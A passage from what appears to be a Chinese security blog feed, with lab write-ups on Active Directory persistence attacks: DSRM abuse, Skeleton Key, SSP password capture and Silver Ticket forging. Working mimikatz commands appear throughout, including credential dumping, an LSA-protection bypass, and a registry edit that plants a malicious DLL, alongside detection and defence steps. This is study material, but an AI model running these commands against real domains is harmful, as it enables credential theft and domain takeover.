class="line">&#x2F;&#x2F;获取SAM数据库的密码</span><br><span class="line">token::elevate </span><br><span class="line">lsadump::sam</span><br></pre></td></tr></table></figure>

<h1 id="0x04-检测"><a href="#0x04-检测" class="headerlink" title="0x04 检测"></a>0x04 检测</h1><ul>
<li><p>sysmon事件1:</p>
<p><img src="/2021/07/15/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E4%B9%8BDSRM-ABUSE/10.png"></p>
</li>
<li></li>
</ul>
<p>在Windows server2019上注册表并未有以下项限制DSRM登录，故可在注册表中新建项：HKLM:\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior<br> 　DSRM的三种登录方式：<br> 　0：默认值，只有当域控重启并进入DSRM模式时，才可以使用DSRM管理员账号。<br> 　1：只有当本地AD、DS服务停止时，才可以使用DSRM管理员账号登录域控。<br> 　2：在任何情况下，都可以使用DSRM管理员账号登录域控。<br> 如果该值为2，说明已遭受过攻击，<strong>此时应该将注册表键值改为0并按照第一种方式重置DSRM密码</strong>。</p>
<h1 id="0x05防御"><a href="#0x05防御" class="headerlink" title="0x05防御"></a>0x05防御</h1><ol>
<li>定期检查注册表中用于控制DSRM登录方式的键值hklm:\system\currentcontrolset\control\lsa\确认该键值为1，或者删除该键值。</li>
<li>定期修改域中所有域控的DSRM账号。</li>
<li>经常检查ID为4794的日志。尝试设置活动目录服务还原模式的管理员密码会被记录在4794日志中。</li>
</ol>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
<li><a href="https://docs.microsoft.com/zh-tw/sql/analytics-platform-system/set-admin-password-for-logging-on-to-ad-nodes-in-directory-services-restore-mode?view=aps-pdw-2016-au7">https://docs.microsoft.com/zh-tw/sql/analytics-platform-system/set-admin-password-for-logging-on-to-ad-nodes-in-directory-services-restore-mode?view=aps-pdw-2016-au7</a></li>
<li><a href="https://www.at449.com/2020/04/27/2017/">https://www.at449.com/2020/04/27/2017/</a></li>
<li><a href="https://www.freebuf.com/articles/network/278999.html">https://www.freebuf.com/articles/network/278999.html</a></li>
</ol>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>域渗透</tag>
        <tag>域控权限</tag>
        <tag>DSRM</tag>
      </tags>
  </entry>
  <entry>
    <title>域渗透维权之Skeleton Key</title>
    <url>/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/</url>
    <content><![CDATA[<h1 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1><p>如上上篇博客所介绍两种利用SSP进行域控权限维持的方法，都需要域控重启才可生效。本篇利用skeleton key则是立即生效，skeleton key可作为金票的替代品。</p>
<h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><ul>
<li><strong>在64位域控服务器上使用</strong>，因为skeleton key被安装在64位DC上</li>
<li><strong>只是让所有域用户使用同一个万能密码进行登录</strong>其目前用户可以用原密码进行登录</li>
<li>但重启后失效</li>
</ul>
<h2 id="mimikatz万能密码实现原理"><a href="#mimikatz万能密码实现原理" class="headerlink" title="mimikatz万能密码实现原理"></a>mimikatz万能密码实现原理</h2><p>在DC上以域控权限运行skeleton,能够将Kerberos认证加密降到RC4_HMAC_MD5，并以内存更新的方式给lsass.exe进程patch一个主密码mimikatz。</p>
<h1 id="0x02-测试"><a href="#0x02-测试" class="headerlink" title="0x02 测试"></a>0x02 测试</h1><h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a><strong>测试环境</strong></h3><table>
<thead>
<tr>
<th align="center">IP</th>
<th align="center">描述</th>
<th>系统</th>
</tr>
</thead>
<tbody><tr>
<td align="center">192.168.221.139</td>
<td align="center">DC</td>
<td>windows server 2019(x64)</td>
</tr>
<tr>
<td align="center">192.168.221.140</td>
<td align="center">域管/域成员</td>
<td>windows 10(x64)</td>
</tr>
</tbody></table>
<h3 id="攻击测试"><a href="#攻击测试" class="headerlink" title="攻击测试"></a>攻击测试</h3><p>1.在DC上以域控权限运行skeleton key,将Kerberos的认证加密降到RC4_HMAC_MD5，并以内存更新的方式给lsass.exe进程patch密码mimikatz。但是为什么要这么做还是得把所有攻击复现完成之后看看mimikatz的源码，这个工程量一定巨大</p>
<p><img src="/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/0.png"></p>
<p>此处借用后续绕过PPL的图，先提到debug权限，然后patch密码</p>
<p>2.域内用户利用skeleton key登录域控</p>
<p>域控使用密码mimikatz建立IPC连接－net use</p>
<p><img src="/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/1.png"></p>
<p>域管账户登录域控</p>
<p><img src="/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/2.png"></p>
<p>普通账户登录域控时可以发现根本没有权限.可以证明只有patch了密码的域管账号才可以查看DC的目录。</p>
<p><img src="/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/3.png"></p>
<h3 id="LSA保护"><a href="#LSA保护" class="headerlink" title="LSA保护"></a>LSA保护</h3><p>为了防止对lsass.exe的代码注入，微软在14年添加了<strong>LSA保护策略</strong>，便无法使用mimikatz对lsass.exe进行注入。当然需要我们配置一下注册表</p>
<p><img src="/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/4.png"></p>
<p>重启系统</p>
<p>试试mimikatz直接patch万能密码，发现不可行<br><img src="/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/5.png"></p>
<h3 id="绕过LSA"><a href="#绕过LSA" class="headerlink" title="绕过LSA"></a>绕过LSA</h3><p>当然对于LSA protection，mimikatz也是有办法绕过的.必须<strong>驱动文件：mimidrv.sys</strong>。导入驱动文件后，绕过LSA保护</p>
<p><img src="/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/6.png"></p>
<p>直接用域管账号测试：</p>
<p><img src="/2021/07/14/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSkeleton-Key/7.png"></p>
<p>测试结束记得重启域控</p>
<h3 id="命令集合："><a href="#命令集合：" class="headerlink" title="命令集合："></a><strong>命令集合：</strong></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 清除net use连接</span><br><span class="line">net use * &#x2F;del &#x2F;y</span><br><span class="line"># 用户名密码建立net use共享资源连接</span><br><span class="line">net use \\域控主机全名  mimikatz &#x2F;user:用户名</span><br><span class="line"></span><br><span class="line"># mimikatz patch密码</span><br><span class="line">privilege::debug</span><br><span class="line">misc::skeleton</span><br><span class="line"># 绕过LSA protection</span><br><span class="line">privilege::debug</span><br><span class="line">!+</span><br><span class="line">!processprotect &#x2F;process:lsass.exe &#x2F;remove</span><br><span class="line">misc::skeleton</span><br></pre></td></tr></table></figure>

<h1 id="0x04-检测"><a href="#0x04-检测" class="headerlink" title="0x04 检测"></a>0x04 检测</h1><ul>
<li>日志4697：记录mimidrv.sys驱动的安装事件</li>
<li>sysmon日志13：mimidrv服务及对应的驱动程序</li>
<li>sysmon日志6：驱动被加载且未签名</li>
</ul>
<h1 id="0x05-防御"><a href="#0x05-防御" class="headerlink" title="0x05 防御"></a>0x05 防御</h1><ul>
<li>zBang扫描子项：Skeleton Key scan - 发现可能被 Skeleton Key 恶意感染的域控</li>
<li>SkeletonKeyScanner脚本扫描，主要通过文件名 Yara规则 已知恶意与非恶意文件的哈希 进程等进行检测：<a href="https://github.com/Neo23x0/SkeletonKeyScanner">https://github.com/Neo23x0/SkeletonKeyScanner</a></li>
</ul>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>红队可以用Skeleton Key可在不需要破解任何域用户密码的情况下访问域内主机和网络资源。唯一的缺陷是当DC重启后，将不起作用。</p>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
<li><a href="https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Skeleton%20Key.html">https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Skeleton%20Key.html</a></li>
<li><a href="https://github.com/SwiftOnSecurity/sysmon-config/blob/master/sysmonconfig-export.xml">https://github.com/SwiftOnSecurity/sysmon-config/blob/master/sysmonconfig-export.xml</a></li>
<li><a href="https://pentestlab.blog/2018/04/10/skeleton-key/">https://pentestlab.blog/2018/04/10/skeleton-key/</a></li>
</ol>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>skeleton key</tag>
        <tag>域控权限</tag>
      </tags>
  </entry>
  <entry>
    <title>简单恶意样本分析初探</title>
    <url>/2021/07/13/%E7%AE%80%E5%8D%95%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在复现SSP攻击的时候遇到了dll文件的分析，听说web学习到后期一定是二进制，那今天就来敲敲二进制的大门吧，如果文章中有不对的地方，敬请指出</p>
<p>检验样本哈希</p>
<p>　<img src="/2021/07/13/%E7%AE%80%E5%8D%95%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%88%9D%E6%8E%A2/1.png"></p>
<p>查壳：文件由Visual C++所写，无壳</p>
<p>　<img src="/2021/07/13/%E7%AE%80%E5%8D%95%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E5%88%9D%E6%8E%A2/2.png"></p>
<p>参考：</p>
<ol>
<li>IDA使用：<a href="https://z3r3f.gitee.io/2019/02/15/IDA%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/">https://z3r3f.gitee.io/2019/02/15/IDA%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93/</a></li>
</ol>
<p>问题：</p>
<ol>
<li>导入表</li>
<li>资源表</li>
</ol>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>恶意样本</tag>
        <tag>IDA</tag>
      </tags>
  </entry>
  <entry>
    <title>域渗透维权之SSP</title>
    <url>/2021/07/12/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSSP/</url>
    <content><![CDATA[<h1 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1><p>咱今儿来看看单纯的维权，如果拿到了目标机器的system权限，可以利用SSP进行维权。其基础环境如下：</p>
<table>
<thead>
<tr>
<th align="center">IP</th>
<th align="center">描述</th>
<th align="center">系统</th>
</tr>
</thead>
<tbody><tr>
<td align="center">192.168.221.139</td>
<td align="center">DC</td>
<td align="center">windows server 2019(x64)</td>
</tr>
<tr>
<td align="center">192.168.221.140</td>
<td align="center">域管/域成员</td>
<td align="center">windows 10(x64)</td>
</tr>
</tbody></table>
<h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><h2 id="概念："><a href="#概念：" class="headerlink" title="概念："></a>概念：</h2><p><strong>SSP</strong>：Security Support Provider，直译为安全支持提供者，<strong>注册表中为Security Package</strong>.SSP就是一个用来实现身份认证的DLL</p>
<p><strong>SSPI</strong>：Security Support Provider Interface，直译为安全支持提供程序接口，是<strong>Windows系统在执行认证操作所使用的API</strong>。SSPI是SSP的API接口</p>
<p><img src="/2021/07/12/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSSP/1.png"></p>
<p><strong>lsass.exe</strong> ：作为Windows的系统进程，用于本地安全和登录策略;<strong>系统启动时，SSP 将被加载到lsass.exe进程中</strong>。</p>
<p><strong>LSA</strong> ：Local Security Authority，用于身份验证; 且可进行扩展。</p>
<h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p>因为LSA是可扩展的，所以可以自定义恶意dll,在系统启动时加载到lsass.exe进程中，就可获取lsass.exe中的明文密码。即使用户更改密码并重新登录，攻击者依然可以获取其新密码。</p>
<p>主要有两种攻击方式，体现于0x02和0x03</p>
<h1 id="0x02-memssp加载到内存："><a href="#0x02-memssp加载到内存：" class="headerlink" title="0x02 memssp加载到内存："></a>0x02 memssp加载到内存：</h1><p><strong>原理：</strong>主要通过往lsass进程注入代码来patch其加载的msv1_0.dll中的<strong>SpAcceptCredentials</strong>函数来恢复凭据信息。</p>
<p><strong>功能：</strong>在登录的过程中获取用户的明文密码并存储在system32的mimilsa.log中。此攻击不会在二进制系统中留下二进制文件，一旦域控重启，注入代码就会失效。</p>
<p><img src="/2021/07/12/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSSP/5.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::memssp</span><br></pre></td></tr></table></figure>

<p>当<strong>系统重启</strong>再次进行身份验证的时候，会在System32目录下创建mimilsa.log</p>
<p><img src="/2021/07/12/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSSP/4.png"></p>
<h1 id="0x03-SSP中加载mimilib-dll"><a href="#0x03-SSP中加载mimilib-dll" class="headerlink" title="0x03 SSP中加载mimilib.dll"></a>0x03 SSP中加载mimilib.dll</h1><p><strong>原理：</strong>mimikatz自带mimilib.dll也实现了SSP功能，mimikatz利用AddSecurityPackage此API来加载SSP，可在不重启的情况下添加mimilib.dll。</p>
<p>该dll包含SpLsaModelntialize导出函数，lsass.exe会使用该函数来初始化包含多个回调函数的一个结构体，其中回调函数SpAcceptCredentials用来接收LSA传递的明文凭据</p>
<h2 id="操作："><a href="#操作：" class="headerlink" title="操作："></a>操作：</h2><h3 id="添加SSP"><a href="#添加SSP" class="headerlink" title="添加SSP"></a>添加SSP</h3><p>将mimikatz提供的mimilib.dll复制到c:\windows\system32，与lsass进程位置相同，以便获取访问受感染主机的任何用户的登陆凭证</p>
<h3 id="设置SSP"><a href="#设置SSP" class="headerlink" title="设置SSP"></a>设置SSP</h3><p>修改DC注册表HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages\</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#修改注册表项</span><br><span class="line">reg add &quot;hklm\system\currentcontrolset\control\lsa\&quot; &#x2F;v &quot;Security Packages&quot; &#x2F;d &quot;kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib&quot; &#x2F;t REG_MULTI_SZ</span><br><span class="line">#查看注册表项是否注入恶意dll</span><br><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/12/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSSP/2.png"></p>
<p>重启系统，当域用户再次进行身份验证时-锁屏并打开，将System32目录下创建kiwissp文件，记录用户账户及明文密码</p>
<p><img src="/2021/07/12/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSSP/3.png"></p>
<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><ul>
<li>加载到内存：必须重新登录，重新启动后不会存在</li>
<li>ssp中加载dll：必须重启，永久有效</li>
</ul>
<h1 id="0x05-检测及清理"><a href="#0x05-检测及清理" class="headerlink" title="0x05 检测及清理"></a>0x05 检测及清理</h1><h2 id="1-检测"><a href="#1-检测" class="headerlink" title="1.检测"></a>1.检测</h2><h3 id="memssp"><a href="#memssp" class="headerlink" title="memssp:"></a>memssp:</h3><ul>
<li><p>只能通过sysmon监控到mimilsa.log创建的日志</p>
<p>sysmon检测创建文件事件-事件11</p>
<p><img src="/2021/07/12/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSSP/6.png"></p>
</li>
</ul>
<h3 id="SSP中加载mimilib-dll："><a href="#SSP中加载mimilib-dll：" class="headerlink" title="SSP中加载mimilib.dll："></a>SSP中加载mimilib.dll：</h3><ul>
<li><p>sysmon4622事件：记录了lsass进程加载mimilib的过程</p>
</li>
<li><p>sysmon11事件：mimilib落盘</p>
</li>
<li><p>sysmon13事件：注册表修改</p>
</li>
<li><p>sysmon7事件：dll加载</p>
</li>
</ul>
<h2 id="2-防御清除："><a href="#2-防御清除：" class="headerlink" title="2.防御清除："></a>2.防御清除：</h2><h3 id="memssp-1"><a href="#memssp-1" class="headerlink" title="memssp:"></a>memssp:</h3><ul>
<li>查看Windows\System32下是否有mimilsa.log文件</li>
<li>使用ARK工具查看msv1_0.dll是否已经被inlinehook(修改函数体实现)</li>
</ul>
<h3 id="mimilib-dll加载"><a href="#mimilib-dll加载" class="headerlink" title="mimilib.dll加载:"></a>mimilib.dll加载:</h3><ul>
<li>检测此位置是否加载恶意dll</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa\Security Packages\ </span><br></pre></td></tr></table></figure>

<ul>
<li>检测Windows\System32是否有kiwissp.log</li>
</ul>
<p>Autoruns可用来检测LSA，报告出dll的位置</p>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
<li><p>创建的域用户本身拥有登录权限。登录用户名记得是<strong>域名\创建用户名</strong></p>
</li>
<li><p>winver查看系统版本</p>
<p><img src="/2021/07/12/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%BB%B4%E6%9D%83%E4%B9%8BSSP/0.png"></p>
</li>
<li><p>ARK：<a href="https://openark.blackint3.com/">https://openark.blackint3.com/</a></p>
</li>
<li><p>主要参考：<a href="https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Security%20Support%20Provider.html">https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Security%20Support%20Provider.html</a></p>
</li>
<li><p><a href="https://yanmie-art.github.io/2021/03/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/">https://yanmie-art.github.io/2021/03/01/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</a></p>
</li>
<li><p><a href="https://www.cnblogs.com/xiaozi/p/11834327.html">https://www.cnblogs.com/xiaozi/p/11834327.html</a></p>
</li>
<li><p>sysmon:<a href="https://www.sysgeek.cn/sysmon/">https://www.sysgeek.cn/sysmon/</a></p>
</li>
</ol>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>域渗透</tag>
        <tag>维持权限</tag>
        <tag>SSP</tag>
      </tags>
  </entry>
  <entry>
    <title>域渗透维权之银票</title>
    <url>/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E7%BB%B4%E6%9D%83%E4%B9%8B%E9%93%B6%E7%A5%A8/</url>
    <content><![CDATA[<h1 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h1><p>利用PTT票据传递攻击，就可以替代明文密码。PTT包括金票和银票利用</p>
<h1 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h1><p>白银票据用来伪造ST。我们实验利用白银票据提升普通用户的条件、利用方式及检测攻击方式介绍如下</p>
<table>
<thead>
<tr>
<th align="center">IP</th>
<th align="center">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="center">192.168.221.139</td>
<td align="center">DC</td>
</tr>
<tr>
<td align="center">192.168.221.140</td>
<td align="center">域成员</td>
</tr>
</tbody></table>
<h1 id="0x02票据生成条件"><a href="#0x02票据生成条件" class="headerlink" title="0x02票据生成条件"></a>0x02票据生成条件</h1><ul>
<li><p>域名 </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net config workstation</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E7%BB%B4%E6%9D%83%E4%B9%8B%E9%93%B6%E7%A5%A8/2.png"></p>
</li>
<li><p>域SID</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whoami &#x2F;user</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E7%BB%B4%E6%9D%83%E4%B9%8B%E9%93%B6%E7%A5%A8/0.png"></p>
</li>
<li><p>需要目标server的NTLM-hash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; 1og.txt</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E7%BB%B4%E6%9D%83%E4%B9%8B%E9%93%B6%E7%A5%A8/5.png"></p>
<blockquote>
<p>windows居然可以支持cat哎，太感动了</p>
</blockquote>
</li>
<li><p>伪造任意用户名给予某服务权限</p>
</li>
</ul>
<h1 id="0x03-票据伪造及利用："><a href="#0x03-票据伪造及利用：" class="headerlink" title="0x03 票据伪造及利用："></a>0x03 票据伪造及利用：</h1><p>生成票据：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::gloden &#x2F;user:swanq &#x2F;domain:wlaq.com &#x2F;sid:S-1-5-21-160213220-343523822-3012469542</span><br><span class="line">&#x2F;rc4:44fc74f5b9978830e7ec7dbd66cb4324 &#x2F;target:WIN-2019-DC.wlaq.com &#x2F;service:cifs  &#x2F;ptt </span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E7%BB%B4%E6%9D%83%E4%B9%8B%E9%93%B6%E7%A5%A8/7.png"></p>
<p>此时会成功开启cifs服务的白银票据，即可访问域控主机的共享目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir \\WIN-2019-DC\c$</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E7%BB%B4%E6%9D%83%E4%B9%8B%E9%93%B6%E7%A5%A8/8.png"></p>
<blockquote>
<p>为普通域用户增加某计算机的登录权限：AC中某user-&gt;右键属性-&gt;账户-&gt;登录到-&gt;下列计算机-&gt;键入计算机名即可</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">查看计算机名&#x2F;主机名：hostname</span><br><span class="line">验证某计算机是否位于特定于：nltest &#x2F;dsgetdc:wlaq</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E7%BB%B4%E6%9D%83%E4%B9%8B%E9%93%B6%E7%A5%A8/4.png"></p>
<h1 id="0x04-检测及清理"><a href="#0x04-检测及清理" class="headerlink" title="0x04 检测及清理"></a>0x04 检测及清理</h1><h2 id="检测："><a href="#检测：" class="headerlink" title="检测："></a>检测：</h2><p>请求域控ntlm-hash日志记录如下，注意到在申请ntlm hash时会产生此异地申请hash地址(其中域控IP为139)。</p>
<p><img src="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E7%BB%B4%E6%9D%83%E4%B9%8B%E9%93%B6%E7%A5%A8/9.png"></p>
<p>kerberos</p>
<p><img src="/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%8F%90%E6%9D%83%E7%BB%B4%E6%9D%83%E4%B9%8B%E9%93%B6%E7%A5%A8/10.png"></p>
<p>此攻击与域控无AS-REQ 、AS-REP通信，也无TGS-REQ / TGS-REP通信。所有的事件日志都在目标服务器上，所以银票的检测比金票更加困难。但是可以通过查看4624的登陆日志，<strong>查看IpAddress选项处的IP是否常用</strong>及<strong>用户和请求的SID是否匹配</strong>来进行检测。同时<strong>结合后续攻击行为</strong>来判断域内主机是否失陷。</p>
<h2 id="清除："><a href="#清除：" class="headerlink" title="清除："></a>清除：</h2><p>银票使用的是server的哈希，存储于存储域中所有用户的密码哈希的KDC密钥分发中心中。</p>
<ul>
<li>默认情况下，加入域的账户密码每30天更新一次，如果受到攻击，与krbtgt账户相同，需要连续修改两次才可防止再次利用。修改时与金票相同，利用脚本来重置两次密码<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/reset-computermachinepassword?view=powershell-5.1%E3%80%82%E6%88%96%E7%94%A8netdom%E5%91%BD%E4%BB%A4%E6%9D%A5%E9%87%8D%E7%BD%AE%E5%AF%86%E7%A0%81%E4%BB%A5%E9%98%B2%E5%9F%9F%E5%86%85%E5%B7%A5%E4%BD%9C%E4%B8%8D%E6%AD%A3%E5%B8%B8">https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/reset-computermachinepassword?view=powershell-5.1。或用netdom命令来重置密码以防域内工作不正常</a></li>
<li>修改为永久不修改密码时，只需将HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Netlogon\ Parameters\DisablePasswordChange注册表键值改为１。</li>
</ul>
<p>作为使得白银票据持久化的方式，此注册表的键值可用来长期监控以防银票攻击。</p>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
<li><a href="https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/">https://shu1l.github.io/2020/06/06/qian-xi-huang-jin-piao-ju-yu-bai-yin-piao-ju/</a></li>
<li><a href="https://www.jianshu.com/p/4936da524040">https://www.jianshu.com/p/4936da524040</a></li>
<li><a href="https://ares-x.com/2020/03/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%83%EF%BC%89PTT-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/">https://ares-x.com/2020/03/21/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%83%EF%BC%89PTT-%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/</a></li>
<li><a href="https://www.k0rz3n.com/2019/03/17/%E6%B5%85%E6%9E%90%20Kerberos%20%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E4%BB%A5%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/#2-%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE-Silver-Ticket">https://www.k0rz3n.com/2019/03/17/%E6%B5%85%E6%9E%90%20Kerberos%20%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E4%BB%A5%E5%8F%8A%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/#2-%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE-Silver-Ticket</a></li>
<li>NTLM-hash：<a href="https://www.cnblogs.com/0d4y/p/12805112.html">https://www.cnblogs.com/0d4y/p/12805112.html</a></li>
<li>mimkatz官方参考：<a href="https://wooyun.js.org/drops/Mimikatz%20%E9%9D%9E%E5%AE%98%E6%96%B9%E6%8C%87%E5%8D%97%E5%92%8C%E5%91%BD%E4%BB%A4%E5%8F%82%E8%80%83_Part3.html">https://wooyun.js.org/drops/Mimikatz%20%E9%9D%9E%E5%AE%98%E6%96%B9%E6%8C%87%E5%8D%97%E5%92%8C%E5%91%BD%E4%BB%A4%E5%8F%82%E8%80%83_Part3.html</a></li>
</ol>
]]></content>
      <categories>
        <category>域渗透</category>
      </categories>
      <tags>
        <tag>提权</tag>
        <tag>渗透测试</tag>
        <tag>域渗透</tag>
        <tag>网络空间安全</tag>
        <tag>白银票据</tag>
        <tag>维持权限</tag>
      </tags>
  </entry>
  <entry>
    <title>域渗透提权维权之dcsync</title>
    <url>/2021/07/08/%E5%9F%9F%E6%B8%97%E9%80%8F-dcsync/</url>
    <content><![CDATA[<h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h1><p>DCSync是mimikatz的功能/命令。dcsync特点在于不用登录服务器，就可以<strong>远程通过域数据同步复制的方式模仿域控从真实的域控当中请求数据获得想要的用户hash</strong></p>
<h1 id="0x02-dump-hash"><a href="#0x02-dump-hash" class="headerlink" title="0x02 dump hash"></a>0x02 dump hash</h1><h2 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h2><p>有以下任意用户权限即可：</p>
<ul>
<li>Domain Admins组内的用户</li>
